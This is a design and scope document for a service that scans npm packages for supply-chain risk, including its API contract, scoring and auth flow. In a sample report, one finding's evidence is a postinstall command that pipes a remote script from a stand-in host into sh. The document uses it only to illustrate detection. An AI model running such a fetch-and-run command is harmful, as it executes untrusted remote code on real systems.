# MVP Scope

## Goal

A user enters an npm package name, or pastes a `package.json`, and gets a risk report: a score from 0 to 100, a risk level, and a list of findings, each with the evidence that triggered it.

Everything not needed for that is out of the MVP.

## Safety rule

Package code is never executed. The analyzer only reads files and registry metadata.

- Tarballs are downloaded and unpacked in memory only, never written to disk. Symlinks and unsafe paths (absolute or containing `..`) are skipped, and the unpacked size is capped.
- No `npm install`, no `require`/`import` of package files, no lifecycle scripts.
- The files are dropped from memory when the scan ends.

## User flow

1. A visitor submits a package name, and optionally a version (default: `latest`). No login is needed.
2. The API finds the version on the npm registry, creates (or reuses) the version's scan with status `queued` and returns its id immediately.
3. A worker runs the scan in the background.
4. The client polls the scan until it is `completed` or `failed`, then shows the report.

A visitor can also paste a `package.json`. Each dependency becomes its own scan, and one bulk scan groups them so the client can poll all of them in one request.

Logged-in users get the same flow; their scans are linked to their account for history (later).

## In scope

| Area | What is included |
| --- | --- |
| Auth | Optional. Register with username, email and password; login with username or email; JWT, `USER` and `SUPER_ADMIN` roles; optional email verification; password reset by email |
| Scans | Public. Scan one package version per request, processed asynchronously by a worker. Each version has one scan, shared by everyone; scanning it again reruns the same scan |
| Bulk scans | Public. Scan every dependency of a pasted `package.json`, optionally with `devDependencies` |
| Rate limiting | Per-IP limit on `POST /scans`; super admins are not limited |
| Collector | Registry metadata, weekly downloads, the version tarball, and creation date and downloads of dependencies that are not well-known |
| Checks | 1. Install scripts, 2. Typosquatting, 3. Obfuscation, 4. Maintainer and publish anomalies, 5. Suspicious dependencies |
| Scoring | One 0 to 100 score and a risk level per scan |
| Storage | Packages, versions, scans and findings saved in PostgreSQL |
| Reviews | `reviews` table exists in the schema; no UI or API for it yet |
| Web | Scan form, report page, `package.json` scan form and results page |
| Docs | OpenAPI spec served by the API |

## Out of scope (later)

- Scan history page
- Per-user quotas
- Repository link check (does the `repository` field really point to this package)
- Cleaning up scans stuck in `queued` or `running` after a crash
- Review management and dataset export
- CLI tool and GitHub Action
- Scanning private registries or scoped packages that need auth
- Sign in with Google or GitHub (SSO), and linking those accounts from the profile page; SSO accounts count as verified, since the provider already checked the email
- Profile page: users view and edit their own user name, email and password; a changed email must be verified again

## Scan lifecycle

| Status | Meaning |
| --- | --- |
| `queued` | Saved and waiting for a worker |
| `running` | A worker picked it up |
| `completed` | All checks ran and a score was saved |
| `failed` | The scan stopped; `error` says why |

Failure reasons: `package_not_found`, `version_not_found`, `tarball_too_large`, `timeout`, `internal_error`.

Retries:

- `package_not_found` and `version_not_found` fail at once. They are answers from the registry, so trying again gives the same result.
- `timeout` and `internal_error` may be temporary, so the scan is tried up to 3 times, waiting 5 then 10 seconds between attempts. The scan stays `running` between attempts and becomes `failed` only after the last one.
- If the database goes down while the worker runs, the worker pauses: it takes no new jobs and checks the database every 5 seconds, then resumes once it answers. Waiting jobs keep their attempts. The worker also refuses to start while the database is down.

## Scoring

- Each check returns zero or more findings: `{ checkType, severity, summary, evidence }`.
- Severity is `low`, `medium` or `high`.
- A scoring function combines the findings into a score from 0 to 100. Each finding adds points by severity, capped at 100. Weights: `low` 10, `medium` 25, `high` 50 (to be tuned with real data).
- Each completed scan saves the `analyzer_version` that produced it, and a `metadata_snapshot` of the registry facts the checks saw.
- The registry fetch and the analysis must finish within 120 seconds, or the attempt fails with `timeout` and is retried.
- Risk level from the score (initial values, to be tuned with real data):

| Score | Level |
| --- | --- |
| 0 to 39 | `low` |
| 40 to 69 | `medium` |
| 70 to 100 | `high` |

## API contract

### Response format

Every response, success or error, has the same shape:

```json
{
  "status": 200,
  "message": "Success",
  "data": {}
}
```

- `status`: the HTTP status code, always equal to the response's real status.
- `message`: a short human-readable result.
- `data`: the payload. Omitted on most errors; validation errors (`400`) put the list of problems in it.
- `error`: on errors, the HTTP error name, e.g. `Conflict`.
- `context`: on errors, the request that failed, e.g. `POST /auth/register`.

```json
{
  "status": 409,
  "message": "Username is already taken",
  "error": "Conflict",
  "context": "POST /auth/register"
}
```

```json
{
  "status": 400,
  "message": "Validation failed",
  "data": ["Email must be a valid email address", "Password must be at least 8 characters"],
  "error": "Bad Request",
  "context": "POST /auth/register"
}
```

The examples below show `data` only.

Rows are identified by their `uid`, a 10-character random id like `k3F9x2Mq7A`, sent as `uid` in every payload; internal integer ids are never exposed.

### Auth

Every route needs an access token (`Authorization: Bearer <token>`) unless it is public. On public routes the token is optional, but an invalid one is rejected with `401`.

| Endpoint | Access | Body | `data` |
| --- | --- | --- | --- |
| `POST /auth/register` | Public | `userName`, `email`, `password` | `accessToken`, `tokenType`, `expiresIn`, `user` |
| `POST /auth/login` | Public | `userNameOrEmail`, `password` | Same as register |
| `POST /auth/refresh` | Refresh cookie | | `accessToken`, `tokenType`, `expiresIn` |
| `POST /auth/logout` | Refresh cookie | | `null` |
| `GET /auth/me` | Logged in | | `uid`, `userName`, `email`, `role`, `emailVerified` |
| `POST /auth/verify-email` | Public | `token` | `null` |
| `POST /auth/resend-verification` | Logged in | | `null` |
| `POST /auth/forgot-password` | Public | `email` | `null` |
| `POST /auth/reset-password` | Public | `token`, `password` | `null` |

- `userName`: 3 to 30 characters, `a-z`, `0-9`, `_`, `-`. Username and email are stored lowercase.
- `password`: 8 to 128 characters.
- Errors: `400` invalid body, `401` wrong credentials or token, `409` username or email already in use.

#### Email verification and password reset

- Verifying the email is optional: unverified users can log in and use everything; the web app only shows them a banner.
- Register sends a verify email. A failed email doesn't fail the registration; the user can resend it (`409` if already verified).
- Links point to `WEB_URL` (`/verify-email?token=…`, `/reset-password?token=…`). A token works once; the verify link lasts 24 hours, the reset link 30 minutes. An invalid, used or expired token returns `400`.
- Forgot password answers the same whether the email exists or not, so it can't be used to find accounts. Only active users get the email.
- Resetting the password logs the user out everywhere (all refresh tokens are removed).
- Forgot password and resend verification allow 5 requests per 15 minutes per email and per IP; over that, `429`.

#### Access and refresh tokens

- The **access token** (15 minutes by default) is returned in `data` and sent as `Authorization: Bearer <token>`.
- The **refresh token** (7 days by default) is never in the body. Register, login and refresh set it in the `refresh_token` cookie: `httpOnly`, `SameSite=Strict`, `Path=/auth`, and `Secure` in production.
- When the access token expires, the client calls `POST /auth/refresh`. The browser sends the cookie automatically (the web app must use `credentials: 'include'`). The response has a new access token and the cookie gets a new refresh token.
- Each refresh token works once and is tracked in Redis. Using an already-used refresh token is treated as theft: every refresh token of that user is revoked and they must log in again.
- `POST /auth/logout` revokes the refresh token and clears the cookie.

### Scans

These endpoints are public. When a valid JWT is sent to `POST /scans` or `POST /scans/bulk`, the new scans are linked to that user.

#### `POST /scans`

Start a scan.

Request:

```json
{
  "packageName": "some-package",
  "version": "1.2.3"
}
```

- `packageName`: required, must be a valid npm package name.
- `version`: optional, exact version. Defaults to the `latest` dist-tag.

Response `202 Accepted`, `data`:

```json
{
  "uid": "k3F9x2Mq7A",
  "status": "queued",
  "packageName": "some-package",
  "version": "1.2.3",
  "createdAt": "2026-10-20T10:00:00.000Z"
}
```

`data.status` is the scan status, not the HTTP status. `version` is the exact version that will be scanned; when none was given, it is the `latest` dist-tag.

Each package version has one scan. If that scan is `queued` or `running`, it is returned as it is. If it is `completed` or `failed`, it is scanned again on the same `uid`.

Errors: `400` invalid body, `401` a token was sent but is invalid, `404` package or version not found on the npm registry, `429` rate limit exceeded, `502`/`504` the npm registry is unreachable or timed out.

#### `GET /scans/:uid`

Get a scan and its report.

Response `200 OK` (completed), `data`:

```json
{
  "uid": "k3F9x2Mq7A",
  "status": "completed",
  "packageName": "some-package",
  "version": "1.2.3",
  "riskScore": 82,
  "riskLevel": "high",
  "findings": [
    {
      "checkType": "install_scripts",
      "severity": "high",
      "summary": "postinstall runs a remote shell script",
      "evidence": "curl http://x.y/z | sh"
    },
    {
      "checkType": "typosquatting",
      "severity": "medium",
      "summary": "Name is 1 edit away from a popular package",
      "evidence": "some-packages"
    }
  ],
  "error": null,
  "createdAt": "2026-10-20T10:00:00.000Z",
  "startedAt": "2026-10-20T10:00:01.000Z",
  "completedAt": "2026-10-20T10:00:09.000Z"
}
```

While `queued` or `running`, `riskScore`, `riskLevel` and `completedAt` are `null` and `findings` is `[]`. When `failed`, `error` holds the failure reason.

Errors: `404` scan not found.

#### `POST /scans/bulk`

Scan every dependency of a `package.json`.

Request:

```json
{
  "packageJson": "{\"name\":\"my-shop-api\",\"dependencies\":{\"express\":\"^4.21.1\"}}",
  "includeDev": true
}
```

- `packageJson`: required, the file's content as text.
- `includeDev`: optional, also scan `devDependencies`. Defaults to `false`. A name in both lists is read once, as a dependency.

How each dependency is handled:

- Ranges and dist-tags (`^4.21.1`, `latest`) resolve to an exact version the way npm does: `latest` when it fits the range, else the highest matching version. `npm:` aliases scan the real package.
- Git, URL, local (`file:`, `link:`) and `workspace:` dependencies are skipped, since their code is not on the registry. So are packages or ranges the registry doesn't have. Each skipped one gets a reason.
- A version that already has a scan reuses it; only a `failed` one is queued again.

No rate limit: one file is one request, and the queue spreads the work.

Response `202 Accepted`, `data`:

```json
{
  "uid": "M8rFTx3DrS",
  "createdAt": "2026-11-05T16:05:27.871Z",
  "total": 4,
  "skipped": 1
}
```

`total` is the number of scans, `skipped` the number of skipped dependencies.

Errors: `400` invalid body, text that is not a JSON object, or a file without dependencies; `401` a token was sent but is invalid.

#### `GET /scans/bulk/:uid`

Get a bulk scan's progress and every package's result.

Response `200 OK`, `data`:

```json
{
  "uid": "M8rFTx3DrS",
  "name": "my-shop-api",
  "includeDev": true,
  "createdAt": "2026-11-05T16:05:27.871Z",
  "progress": { "done": 4, "total": 4 },
  "counts": { "high": 0, "medium": 0, "low": 1, "clean": 3 },
  "items": [
    {
      "packageName": "ms",
      "range": "^2.1.3",
      "isDev": false,
      "scanUid": "yNZIYpVvm5",
      "version": "2.1.3",
      "status": "completed",
      "riskScore": 10,
      "riskLevel": "low",
      "findings": { "high": 0, "medium": 0, "low": 1 },
      "topFinding": "New maintainer since 2.1.2: elsigh, leerobinson"
    }
  ],
  "skipped": [
    {
      "packageName": "my-lib",
      "range": "github:someone/my-lib",
      "isDev": false,
      "reason": "Git dependencies are not scanned"
    }
  ]
}
```

- `name`: the `package.json` `name`, or `null`.
- `progress.done`: scans that are `completed` or `failed`.
- `counts`: completed scans by risk level; `clean` ones had no findings.
- `topFinding`: the summary of the item's most severe finding, or `null`.

Errors: `404` bulk scan not found.

## Limits

Initial values, adjustable through config:

| Limit | Value |
| --- | --- |
| Max tarball size | 50 MB (200 MB unpacked) |
| Scan timeout | 120 seconds |
| Scans per IP | 10 per hour |

## Done when

- A visitor, logged in or not, submits a package name in the web app and sees a scored report with explained findings.
- The API is deployed and documented with OpenAPI.
